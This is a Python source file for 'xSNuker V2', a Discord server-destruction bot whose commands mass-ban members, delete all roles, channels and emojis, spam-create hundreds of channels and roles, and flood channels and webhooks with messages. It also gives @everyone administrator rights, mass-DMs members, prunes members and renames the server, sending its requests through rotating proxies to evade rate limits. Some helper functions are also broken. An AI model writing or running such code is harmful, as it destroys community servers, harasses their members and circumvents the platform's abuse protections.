####################################MODULES########################################
import discord, requests, colorama
import random, os, ctypes, sys, time, json
from discord.ext import commands
from colorama import Fore
from discord.utils import get
from threading import Thread
from itertools import cycle
os.system("title Login To v2")
print("""\033[1;36m
                     __  __
                     \ \/ /
                      \  / 
                      /  \ 
                     /_/\_\\
                     
                  \033[0;33m[\033[0;36mxSNuker V2\033[0;33m]
            \033[1;30m[\033[1;37m>\033[1;30m] \033[0;33mWelcome To \033[0;xxSNuker V2
            \033[1;30m[\033[1;37m>\033[1;30m] \033[0;33mdiscord.gg/ywqezMaVQU
""")

# code = input("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;209mEnter The Key\n\033[1;37m")
# replit.clear()
# os.system('cls')

# while True:
  # if code == "x":
    # os.system('title Logged!')
    # print("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mLogged!")
    # time.sleep(2)
    # replit.clear()
    # os.system('cls')
    # break
  # else:
    # os.system('title Invalid Key')
    # print("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mInvalid Key!\n")
time.sleep(2)
os.system('title Loading Proxies...')

####################################setup##########################################

with open('src/json/xs.json') as f:
  nemo = json.load(f)

prefix = nemo.get('prefix')
channels = nemo.get('channel_name')
roles = nemo.get('role_name')
reason = "xstrong Loveyou"
messages = nemo.get('spam_message')
name = nemo.get('server_name')
allowed = nemo.get('allowed_ids') #id
familyrole = nemo.get('family_role') #id
wallrole = nemo.get('wall_role') #id
noban = nemo.get('unban')  # list of family role IDs

with open('src/json/clientToken.json') as xx:
    nemo2 = json.load(xx)
    token = nemo2.get('token')

try:
    # f = open("src/proxies.txt",'wb')
    # r1 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all")
    # r2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt")
    # f.write(r1.content)
    # f.write(r2.content)
    # f.close()
    proxies = open('src/json/proxies.txt').read().split('\n')
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mLoaded \033[0mproxies.txt")
    os.system('title Proxied Loaded!')
    # replit.clear()
    os.system('cls')
except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mFailed to load \033[0mproxies.txt")
    os.system('title Failed to load Proxies')
time.sleep(2)
proxs = cycle(proxies)
intents = discord.Intents.all()
intents.members = True
intents.messages = True
bot = commands.Bot(command_prefix = prefix, intents=intents, help_command=None)



##################################################################################
def is_allowed(ctx):
  return ctx.message.author.id in allowed
@bot.event
async def on_ready():
    try:
        f = open("botInvite.txt", "w")
        os.system('title Updating invite.txt')
        f.write(f"{bot.user.name} - https://discordapp.com/oauth2/authorize?client_id={bot.user.id}&scope=bot+applications.commands&permissions=8")
        f.close()
    except Exception as e:
        print(f"\033[1;31mError: Can't create the invite link ({e})\033[0m")
    # replit.clear()
    os.system('cls')
    menu()
    await bot.change_presence(status=discord.Status.idle, activity = discord.Game('xstrong'))
    os.system(f'title xSNuker V2 - {prefix}help')
def menu():
    print(f'''\033[1;36m
                     __  __
                     \ \/ /
                      \  / 
                      /  \ 
                     /_/\_\\
                     
                  \033[0;33m[\033[0;36mxSNuker V2\033[0;33m]
           \x1b[38;5;172m Connection \033[0;35m- \x1b[38;5;196m{bot.user}\033[0m - \x1b[38;5;196m{bot.user.id}\033[0m - \x1b[38;5;196m{round(bot.latency *1000)}ms\033[0m
            \x1b[38;5;172mProxy \033[0;35m- \x1b[38;5;34mActive\033[0m
            \x1b[38;5;172mGet started with \x1b[38;5;196m.help\033[0m
''')

###########################################nuke command#######################################
def ban1():
  try:
    for member in list(ctx.guild.members):
      Thread(target=ban, args=(member.id,)).start()
  except:
    pass

def roledel1():
  try:
    for role in list(ctx.guild.roles):
      Thread(target=roledel, args=(role.id,)).start()
  except:
    pass


def channeldel1():
  try:
    for channel in list(ctx.guild.channels):
      Thread(target=channeldel, args=(channel.id,)).start()
  except:
    pass

def channelspam1():
  try:
    for i in range(500):
      Thread(target=channelspam, args=(ctx.guild.id,)).start()
  except:
    pass

def rolespam1():
  try:
    for i in range(250):
      Thread(target=rolespam, args=(ctx.guild.id,)).start()
  except:
    pass

def spam1():
  try:
    while True:
      for channel in list(ctx.guild.channels):
        Thread(target=spam, args=(channel.id,)).start()
  except:
    pass


@bot.command(aliases=['nuke','wizz','fuck'])
@commands.check(is_allowed)
async def trash(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mNuke Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      #banning all members in guild
      
      # def ban(id):
        # headers = {'Authorization': f'Bot {token}'}
        # json = {'reason': reason}
        # proxies = {"http": 'http://' + next(proxs)}
        # requests.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{id}', 
        # headers=headers, 
        # json=json, 
        # proxies=proxies
        # )
      # try:
        # for member in list(ctx.guild.members):
          # Thread(target=ban, args=(member.id,)).start()
          # print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mBanned Member {member} In {guild}")
          # ban1()
      # except:
        # print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Ban Member {member} In {guild}")
        # ban(id)
        # pass
            

      #deleting all roles in the guild
      
      
      def roledel(id):
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{id}', 
        headers=headers, 
        proxies=proxies
        )
      try:
        for role in list(ctx.guild.roles):
          Thread(target=roledel, args=(role.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleted Role {role} In {guild}")
          roledel1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Delete Role {role} In {guild}")
        roledel(id)
        pass
        
        
      #deleting all emojis in guild
    
    
        def emojidel(id):
            headers = {'Authorization': f'Bot {token}'}
            proxies = {"http": 'http://' + next(proxs)},
            try:
                requests.delete(f'https://discord.com/api/v9/guilds/{guild}/emojis/{id}', 
                    headers=headers, 
                    proxies=proxies
                )
                print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleted Emoji {id} In {guild}")
            except:
                print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Delete Emoji {id} In {guild}")
                pass

        try:
            for emoji in list(ctx.guild.emojis):
                Thread(target=emojidel, args=(emoji.id,)).start()
                print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleting Emoji {emoji} In {guild}")
        except:
            print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Retrieve Emojis In {guild}")
            pass
      
      #deleting all channels in guild

      
      def channeldel(id):
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.delete(f'https://discord.com/api/v9/channels/{id}', 
        headers=headers, 
        proxies=proxies
        )
      try:
        for channel in list(ctx.guild.channels):
          Thread(target=channeldel, args=(channel.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleted Channel {channel} In {guild}")
          channeldel1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Delete Channel {channel} In {guild}")
        channeldel(id)
        pass

      #changing the server details
      
      with open((img:="src/logo.png") , "rb") as pic:
        logo = pic.read()
      try:
          await ctx.guild.edit(name=name)
          await ctx.guild.edit(icon=logo)
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mChanged Guild {guild} Details")
      except Exception as e:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Change Details In {guild}")
        pass

      #spam the max amount of channels

      def channelspam(id):
        json = {'name': channels}        
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.post(f'https://discord.com/api/v9/guilds/{id}/channels', headers=headers, json=json, proxies=proxies)
      try:
        for i in range(500):
          Thread(target=channelspam, args=(ctx.guild.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated Channel {channels} In {guild}")
          channelspam1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Create Channel {channels} In {guild}")
        channelspam(id)
        pass
      
      def rolespam(id):
        json = {'name': roles}        
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.post(f'https://discord.com/api/v9/guilds/{id}/roles', 
        headers=headers, 
        json=json, 
        proxies=proxies
        )
      try:
        for i in range(250):
          Thread(target=rolespam, args=(ctx.guild.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated Role {roles} In {guild}")
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mUnable To Create Role {roles} In {guild}")
        pass
      
      # print("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mSpamming Messages Till It Gets Kicked")
      # def spam(id):
        # json = {'content': messages, 'tts': True}
        # headers = {'Authorization': f'Bot {token}'}
        # proxies = {"http": 'http://' + next(proxs)}
        # requests.post(f'https://discord.com/api/v9/channels/{id}/messages', 
        # headers=headers, 
        # json=json,
        # proxies=proxies
        # )
      # try:
        # while True:
          # for channel in list(ctx.guild.channels):
            # Thread(target=spam, args=(channel.id,)).start()
            # spam1()
      # except:
        # pass
      
## Other Commands :P      


@bot.command(aliases=['banall','massban'])
@commands.check(is_allowed)
async def ban(ctx):
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mMassBan Executed By {ctx.author} in {ctx.guild.name}")
    user = ctx.author  
    await ctx.message.delete() 
    guild=ctx.guild.id
    
    def ban(id):
        if id not in noban:       
            headers = {'Authorization': f'Bot {token}'}
            json = {'reason': reason}     
            proxies = {"http": 'http://' + next(proxs)}      
            requests.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{id}', 
            headers=headers, 
            json=json,
            proxies=proxies)
            
    try:
       for member in list(ctx.guild.members):
           if member.id not in noban:    
               Thread(target=ban, args=(member.id,)).start()     
               print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mBanned Member {member} In {guild}")         
               ban1()
    except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Ban Member {member} In {guild}")   
        ban(id)
        pass
        menu()



@bot.command(aliases=['spamchannels','spamchannel','channelsspam','mc','masschannel','masschannels'])
@commands.check(is_allowed)
async def channelspam(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mMassChannel Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      def channelspam(id):
        json = {'name': channels}        
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.post(f'https://discord.com/api/v9/guilds/{id}/channels', headers=headers, json=json, proxies=proxies)
      try:
        for i in range(500):
          Thread(target=channelspam, args=(ctx.guild.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated Channel {channels} In {guild}")
          channelspam1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Create Channel {channels} In {guild}")
        channelspam(id)
        pass
        menu()
      
@bot.command(aliases=['spamchannels2','spamchannel2','channelsspam2','mc2','masschannels2','masschannel2'])
@commands.check(is_allowed)
async def channelspam2(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mMassChannel2 Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      try:
        for i in range(250):
          await ctx.guild.create_text_channel(name=f'{channels}')
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated Channel {channels} In {guild}")
      except:
        pass
        menu()

@bot.command(aliases=['spamroles','spamrole','rolesspam','mr','massrole','massroles'])
@commands.check(is_allowed)
async def rolespam(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mMassRole Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      def rolespam(id):
        json = {'name': roles}        
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.post(f'https://discord.com/api/v9/guilds/{id}/roles', 
        headers=headers, 
        json=json, 
        proxies=proxies
        )
      try:
        for i in range(250):
          Thread(target=rolespam, args=(ctx.guild.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated Role {roles} In {guild}")
          rolespam1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Create Role {roles} In {guild}")
        rolespam(id)
        pass
        os.system('cls')
        menu()
      
@bot.command(aliases=['delchannels','delchannel','deletechannels','deletechannel','dc'])
@commands.check(is_allowed)
async def channeldelete(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mChannelDelete Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      def channeldel(id):
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.delete(f'https://discord.com/api/v9/channels/{id}', 
        headers=headers, 
        proxies=proxies
        )
      try:
        for channel in list(ctx.guild.channels):
          Thread(target=channeldel, args=(channel.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleted Channel {channel} In {guild}")
          channeldel1()
        new_channel = await ctx.guild.create_text_channel("xstrong chat")
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCreated new channel {new_channel} In {guild}")
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Delete Channel {channel} In {guild}")
        channeldel(id)
        pass
        os.system('cls')
        menu()
      
@bot.command(aliases=['delroles','delrole','deleteroles','deleterole','dr'])
@commands.check(is_allowed)
async def roledelete(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mRoleDelete Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      def roledel(id):
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{id}', 
        headers=headers, 
        proxies=proxies
        )
      try:
        for role in list(ctx.guild.roles):
          Thread(target=roledel, args=(role.id,)).start()
          print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDeleted Role {role} In {guild}")
          roledel1()
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Delete Role {role} In {guild}")
        roledel(id)
        pass
        os.system('cls')
        menu()
      
      
@bot.command(aliases=['webhookspam','spamwebhook',"pings"])
@commands.check(is_allowed)
async def spam(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mSpam Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      def spam(id):
        json = {'content': messages, 'tts': True}
        headers = {'Authorization': f'Bot {token}'}
        proxies = {"http": 'http://' + next(proxs)}
        requests.post(f'https://discord.com/api/v9/channels/{id}/messages', 
        headers=headers, 
        json=json,
        proxies=proxies
        )
      try:
        while True:
          for channel in list(ctx.guild.channels):
            Thread(target=spam, args=(channel.id,)).start()
      except:
        pass
        os.system('cls')
        menu()
      
@bot.command()
@commands.check(is_allowed)
async def leave(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mLeave Executed By {ctx.author} in {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id
      
      guild = ctx.message.guild
      await ctx.guild.leave()
      await ctx.author.send(f"[>] Left Guild {guild}!!!")
      pass
      os.system('cls')
      menu()

@bot.command()
@commands.check(is_allowed)
async def dm(ctx, *, message:str):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mDm Executed By {ctx.author} in {ctx.guild.name}")
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34m+ \033[0;31m{user}")
    except:
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196m- \033[0;31m{user}")

@bot.command()
@commands.check(is_allowed)
async def admin(ctx):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mAdmin Executed By {ctx.author} in {ctx.guild.name}")
  await ctx.message.delete()
  for role in ctx.guild.roles:
    if role.name == '@everyone':
      try:
        prms = discord.Permissions()
        prms.administrator = True
        await role.edit(permissions=prms)
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
      except:
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")  

@bot.command(aliases=['sastanuke','renamenuke','renameall','securitynuke','snuke','editall'])
@commands.check(is_allowed)
async def rename(ctx, *, name):
  await ctx.message.delete()
  with open((img:="src/logo.png") , "rb") as pic:
    logo = pic.read()
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mRename Executed By {ctx.author} in {ctx.guild.name}")
  try:
    await ctx.guild.edit(name=name)
    await ctx.guild.edit(icon=logo)
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mChanged {ctx.guild.name}")
  except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to edit {ctx.guild.name}")
  for role in ctx.guild.roles:
    try:
      await role.edit(name=name)
    except:
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to edit {role}")
  for channel in ctx.guild.channels:
    try:
      await channel.edit(name=name)
    except:
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to edit {channel}")
  
@bot.command(aliases=['cp','estprune','estimateprune','prunecheck'])
@commands.check(is_allowed)
async def checkprune(ctx, day:int):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mCheckPrune Executed By {ctx.author} in {ctx.guild.name}")
  try:
    kek = await ctx.guild.estimate_pruned_members(days=day, roles=ctx.guild.roles)
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34m{kek} members will get kicked on pruning this server with all roles and **{day}** day\(s\) of inactivity.")
    await ctx.send(f"> **{kek}** members will get kicked on pruning this server with all roles and **{day}** day\(s\) of inactivity.")
  except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to check {ctx.guild.name}")


@bot.command(aliases=['p'])
@commands.check(is_allowed)
async def prune(ctx, day:int):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mPrune Executed By {ctx.author} in {ctx.guild.name}")
  try:
    kek = await ctx.guild.prune_members(days=day, compute_prune_count=False, roles=ctx.guild.roles, reason = reason)
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mPruned {kek} members with {day} of inactivity in {ctx.guild.name}")
    await ctx.send(f"> Pruned **{kek}** members with {day} of inactivity in {ctx.guild.name}")
  except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to prune {ctx.guild.name}")

@bot.command(aliases=['rcp','roleestprune','roleestimateprune','roleprunecheck','rolecheckprune','rprunecheck','rpc'])
@commands.check(is_allowed)
async def rcheckprune(ctx, day:int):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mRoleCheckPrune Executed By {ctx.author} in {ctx.guild.name}")
  w = ctx.guild.get_role(wallrole)
  f = ctx.guild.get_role(familyrole)
  rols = [w,f]
  try:
    kek = await ctx.guild.estimate_pruned_members(days=day, roles=rols)
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34m{kek} members will get kicked on pruning this server with all roles and {day} day\(s\) of inactivity.")
    await ctx.send(f"> **{kek}** members will get kicked on pruning this server with all roles and **{day}** day\(s\) of inactivity.")
  except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to check {ctx.guild.name}")


@bot.command(aliases=['rp','rolep'])
@commands.check(is_allowed)
async def roleprune(ctx, day:int):
  print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mRolePrune Executed By {ctx.author} in {ctx.guild.name}")
  w = ctx.guild.get_role(wallrole)
  f = ctx.guild.get_role(familyrole)
  rols = [w,f]
  try:
    kek = await ctx.guild.prune_members(days=day, compute_prune_count=False, roles=rols, reason = reason)
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mPruned {kek} members with {day} of inactivity in {ctx.guild.name}")
    await ctx.send(f"> Pruned **{kek}** members with {day} of inactivity in {ctx.guild.name}")
  except:
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mUnable to prune {ctx.guild.name}")
@bot.event
async def on_guild_channel_create(ctx):
  for i in range(5):
    await ctx.send(messages)
  webhook = await ctx.create_webhook(name='xStrong')
  for i in range(200):
    await webhook.send(messages)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196m{ctx.author} - unauthorised")

###########################################help command######################################
@bot.command(aliases=['h'])
@commands.check(is_allowed)
async def help(ctx):
    print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mHelp Executed By {ctx.author} in {ctx.guild.name}")
    await ctx.message.delete()
    desc = ""
    for cmd in bot.commands:
      desc+=cmd.name+"\n"
    embedVa2r = discord.Embed(color=discord.Color.red(),title="xSNuker V2",
                             description=f"""
.tash - Trash Server
.massban - Bans All Members In Guild
.mc - Spam Creates Channels
.mc2 - Spam Creates Channels (more webhook spam)
.mr - Spam Creates Roles
.dr - Deletes all roles in guild
.dc - Deletes all channels in guild
.pings - Spams Messages
.admin - Give administrator permission to everyone role
.dm <text> - Dm all members in server
.prune <day> - Prune members
.checkprune <day> - Check pruning of server
.roleprune <day> - Prune members with selected roles(use if there are 100+ roles in server)
.rpc <day> - Check Pruning of server with selected roles(use if there are 100+ roles in server)
.rename <text> - Rename everything in server
.leave - Leave the guild(don't use)
                             """
                             )
#, description=f"{prefix}nuke - Trash Server\n{prefix}massban - Bans All Members In Guild\n{prefix}mc - Spam Creates Channels\n{prefix}mc2 - Spam Creates Channels (more webhook spam)\n{prefix}dr - Deletes all roles in guild\n{prefix}emojidelete - Delete all emojis in guild\n{prefix}pings - Spams Messages\n{prefix}admin - Give administrator permission to everyone role\n{prefix}dm <text> - Dm all members in server\n{prefix}prune <day> - Prune members\n{prefix}checkprune <day> - Check pruning of server\n{prefix}roleprune <day> - Prune members with selected roles\n{prefix}checkroleprune <day> - Check Pruning of server with selected roles\n{prefix}rename <text> - Rename everything in server\n{prefix}leave - Leave the guild(don't use)")
    embedVa2r.set_footer(text="created by xstrong4")
    await ctx.author.send(embed=embedVa2r)



bot.run(token) 
